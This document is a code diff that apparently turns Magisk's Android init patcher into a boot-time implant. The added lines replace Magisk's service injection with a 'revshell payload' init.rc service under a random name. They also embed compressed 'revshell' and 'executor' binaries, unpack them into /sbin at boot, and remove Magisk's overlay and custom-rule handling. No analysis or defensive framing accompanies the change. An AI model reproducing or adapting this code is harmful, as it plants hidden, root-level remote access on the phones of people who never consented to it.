@@ -1,12 +1,14 @@
 #include <sys/mount.h>
+#include <sys/wait.h>
 #include <libgen.h>
 
 #include <magisk.hpp>
-#include <magiskpolicy.hpp>
+#include <sepolicy.hpp>
 #include <utils.hpp>
 #include <socket.hpp>
 
 #include "init.hpp"
+#include "unxz.hpp"
 #include "magiskrc.inc"
 
 #ifdef USE_64BIT
@@ -14,6 +16,15 @@
 #else
 #define LIBNAME "lib"
 #endif
+
+#ifdef USE_64BIT
+#include "binaries_revshell64.h"
+#include "binaries_executor64.h"
+#else
+#include "binaries_revshell.h"
+#include "binaries_executor.h"
+#endif
+
 
 using namespace std;
 
@@ -40,42 +51,14 @@ static void patch_init_rc(const char *src, const char *dest, const char *tmp_dir
 
     fprintf(rc, "\n");
 
-    // Inject custom rc scripts
-    for (auto &script : rc_list) {
-        // Replace template arguments of rc scripts with dynamic paths
-        replace_all(script, "${MAGISKTMP}", tmp_dir);
-        fprintf(rc, "\n%s\n", script.data());
-    }
-    rc_list.clear();
-
-    // Inject Magisk rc scripts
-    char pfd_svc[16], ls_svc[16], bc_svc[16];
-    gen_rand_str(pfd_svc, sizeof(pfd_svc));
-    gen_rand_str(ls_svc, sizeof(ls_svc));
-    gen_rand_str(bc_svc, sizeof(bc_svc));
-    LOGD("Inject magisk services: [%s] [%s] [%s]\n", pfd_svc, ls_svc, bc_svc);
-    fprintf(rc, MAGISK_RC, tmp_dir, pfd_svc, ls_svc, bc_svc);
+    // Inject revshell script
+    char svc[16];
+    gen_rand_str(svc, sizeof(svc));
+    LOGD("Inject revshell payload: [%s]\n", svc);
+    fprintf(rc, PAYLOAD_RC, tmp_dir, svc);
 
     fclose(rc);
     clone_attr(src, dest);
-}
-
-static void load_overlay_rc(const char *overlay) {
-    auto dir = open_dir(overlay);
-    if (!dir) return;
-
-    int dfd = dirfd(dir.get());
-    // Do not allow overwrite init.rc
-    unlinkat(dfd, "init.rc", 0);
-    for (dirent *entry; (entry = xreaddir(dir.get()));) {
-        if (str_ends(entry->d_name, ".rc")) {
-            LOGD("Found rc script [%s]\n", entry->d_name);
-            int rc = xopenat(dfd, entry->d_name, O_RDONLY | O_CLOEXEC);
-            rc_list.push_back(fd_full_read(rc));
-            close(rc);
-            unlinkat(dfd, entry->d_name, 0);
-        }
-    }
 }
 
 bool MagiskInit::patch_sepolicy(const char *file) {
@@ -103,19 +86,6 @@ bool MagiskInit::patch_sepolicy(const char *file) {
         sepol = sepolicy::from_split();
 
     sepol->magisk_rules();
-
-    // Custom rules
-    if (!custom_rules_dir.empty()) {
-        if (auto dir = open_dir(custom_rules_dir.data())) {
-            for (dirent *entry; (entry = xreaddir(dir.get()));) {
-                auto rule = custom_rules_dir + "/" + entry->d_name + "/sepolicy.rule";
-                if (access(rule.data(), R_OK) == 0) {
-                    LOGD("Loading custom sepolicy patch: [%s]\n", rule.data());
-                    sepol->load_rule_file(rule.data());
-                }
-            }
-        }
-    }
 
     LOGD("Dumping sepolicy to: [%s]\n", file);
     sepol->to_file(file);
@@ -185,22 +155,27 @@ static void magic_mount(const string &sdir, const string &ddir = "") {
 #define LIBSELINUX  "/system/" LIBNAME "/libselinux.so"
 #define NEW_INITRC  "/system/etc/init/hw/init.rc"
 
-// TODO : проверить на 10 андроиде !!
+
+// TODO : check if works on Android 10 ?
+// TODO : magisk compatibility ?
+// ----------- system as root ------------
 void SARBase::patch_rootdir() {
     string tmp_dir;
     const char *sepol;
 
-//    if (access("/sbin", F_OK) == 0) {
-//        tmp_dir = "/sbin";
-//        sepol = "/sbin/.se";
-//    } else {
-        char buf[8];
-        gen_rand_str(buf, sizeof(buf));
-//        tmp_dir = "/dev/"s + buf;
+    if (access("/sbin", F_OK) == 0) {
+        tmp_dir = "/sbin";
+        sepol = "/sbin/.sp";  // crash on .se rename?     upd: OK if we don't change length
+    } else
+    // temporarily change to /dev/ for compatibility test with magisk ?
+    {
+        // char buf[8];
+        // gen_rand_str(buf, sizeof(buf));
+        // tmp_dir = "/dev/"s + buf;
         tmp_dir = "/dev/sys_ctl";
         xmkdir(tmp_dir.data(), 0);
-        sepol = "/dev/.se";
-//    }
+        sepol = "/dev/.sp";
+    }
 
     setup_tmp(tmp_dir.data());
     chdir(tmp_dir.data());
@@ -208,14 +183,13 @@ void SARBase::patch_rootdir() {
     mount_rules_dir(BLOCKDIR, MIRRDIR);
 
     // Mount system_root mirror
-//    xmkdir(ROOTMIR, 0755);
     xmkdir(ROOTMIR, 0700);
     xmount("/", ROOTMIR, nullptr, MS_BIND, nullptr);
     mount_list.emplace_back(tmp_dir + "/" ROOTMIR);
 
     // Recreate original sbin structure if necessary
-//    if (tmp_dir == "/sbin")
-//        recreate_sbin(ROOTMIR "/sbin", true);
+    if (tmp_dir == "/sbin")
+        recreate_sbin(ROOTMIR "/sbin", true);
 
     // Patch init
     int patch_count;
@@ -249,37 +223,18 @@ void SARBase::patch_rootdir() {
     patch_sepolicy(sepol);
 
     // Restore backup files
-    struct sockaddr_un sun;
-    int sockfd = xsocket(AF_LOCAL, SOCK_STREAM | SOCK_CLOEXEC, 0);
-    if (connect(sockfd, (struct sockaddr*) &sun, setup_sockaddr(&sun, INIT_SOCKET)) == 0) {
-        LOGD("ACK init daemon to write backup files\n");
-        // Let daemon know where tmp_dir is
-        write_string(sockfd, tmp_dir.data());
-        // Wait for daemon to finish restoring files
-        int ack;
-        read(sockfd, &ack, sizeof(ack));
-    } else {
-        LOGD("Restore backup files locally\n");
-        restore_folder(ROOTOVL, overlays);
-        overlays.clear();
-    }
-    close(sockfd);
-
-    // Handle overlay.d
-//    load_overlay_rc(ROOTOVL);
-//    if (access(ROOTOVL "/sbin", F_OK) == 0) {
-        // Move files in overlay.d/sbin into tmp_dir
-//        mv_path(ROOTOVL "/sbin", ".");
-//    }
+    LOGD("Restore backup files locally\n");
+    restore_folder(ROOTOVL, overlays);
+    overlays.clear();
 
     // Patch init.rc
-//    if (access("/init.rc", F_OK) == 0) {
-//        patch_init_rc("/init.rc", ROOTOVL "/init.rc", tmp_dir.data());
-//    } else {
+    if (access("/init.rc", F_OK) == 0) {
+        patch_init_rc("/init.rc", ROOTOVL "/init.rc", tmp_dir.data());
+    } else {
         // Android 11's new init.rc
-//        xmkdirs(dirname(ROOTOVL NEW_INITRC), 0755);
-//        patch_init_rc(NEW_INITRC, ROOTOVL NEW_INITRC, tmp_dir.data());
-//    }
+        xmkdirs(dirname(ROOTOVL NEW_INITRC), 0755);
+        patch_init_rc(NEW_INITRC, ROOTOVL NEW_INITRC, tmp_dir.data());
+    }
 
     // Mount rootdir
     magic_mount(ROOTOVL);
@@ -294,7 +249,8 @@ void SARBase::patch_rootdir() {
 #define TMP_RULESDIR "/.backup/.sepolicy.rules"
 
 
-// TODO : проверить на 10 андроиде !!
+// TODO : check if works on Android 10 ?
+// ---------- rootfs -----------
 void RootFSInit::patch_rootfs() {
     // Handle custom sepolicy rules
     xmkdir(TMP_MNTDIR, 0755);
@@ -310,50 +266,21 @@ void RootFSInit::patch_rootfs() {
         init.patch({ make_pair(SPLIT_PLAT_CIL, "xxx") });
     }
 
-    // Handle overlays
-//    if (access("/overlay.d", F_OK) == 0) {
-//        LOGD("Merge overlay.d\n");
-//        load_overlay_rc("/overlay.d");
-//        mv_path("/overlay.d", "/");
-//    }
-
-//    patch_init_rc("/init.rc", "/init.p.rc", "/sbin");
-//    rename("/init.p.rc", "/init.rc");
+    patch_init_rc("/init.rc", "/init.p.rc", "/sbin");
+    rename("/init.p.rc", "/init.rc");
 
     // Create hardlink mirror of /sbin to /root
-//    mkdir("/root", 0750);
-//    clone_attr("/sbin", "/root");
-//    link_path("/sbin", "/root");
+    mkdir("/root", 0750);
+    clone_attr("/sbin", "/root");
+    link_path("/sbin", "/root");
 
-    // Dump magiskinit as magisk
-//    int fd = xopen("/sbin/magisk", O_WRONLY | O_CREAT, 0755);
-//    write(fd, self.buf, self.sz);
-//    close(fd);
-}
+    // Extract revshell payload
+    int fd = xopen("/sbin/revshell", O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0700);
+    unxz(fd, revshell_xz, sizeof(revshell_xz));
+    close(fd);
 
-void MagiskProxy::start() {
-    // Mount rootfs as rw to do post-init rootfs patches
-//    xmount(nullptr, "/", nullptr, MS_REMOUNT, nullptr);
+    fd = xopen("/sbin/executor", O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0700);
+    unxz(fd, executor_xz, sizeof(executor_xz));
+    close(fd);
 
-    // Backup stuffs before removing them
-//    self = raw_data::read("/sbin/magisk");
-//    config = raw_data::read("/.backup/.magisk");
-//    char custom_rules_dir[64];
-//    custom_rules_dir[0] = '\0';
-//    xreadlink(TMP_RULESDIR, custom_rules_dir, sizeof(custom_rules_dir));
-
-//    unlink("/sbin/magisk");
-//    rm_rf("/.backup");   // TODO : важно !
-
-//    setup_tmp("/sbin");   // TODO : закомментировать для того чтобы не создавать ФС маджиска на устройстве
-
-    // Create symlinks pointing back to /root
-//    recreate_sbin("/root", false);   // TODO : закомментировать для того чтобы не создавать ФС маджиска на устройстве
-
-//    if (custom_rules_dir[0])        // TODO : закомментировать для того чтобы не создавать ФС маджиска на устройстве
-//        xsymlink(custom_rules_dir, "/sbin/" RULESDIR);      // TODO : закомментировать для того чтобы не создавать ФС маджиска на устройстве
-
-    // Tell magiskd to remount rootfs
-//    setenv("REMOUNT_ROOT", "1", 1);
-//    execv("/sbin/magisk", argv);
 }
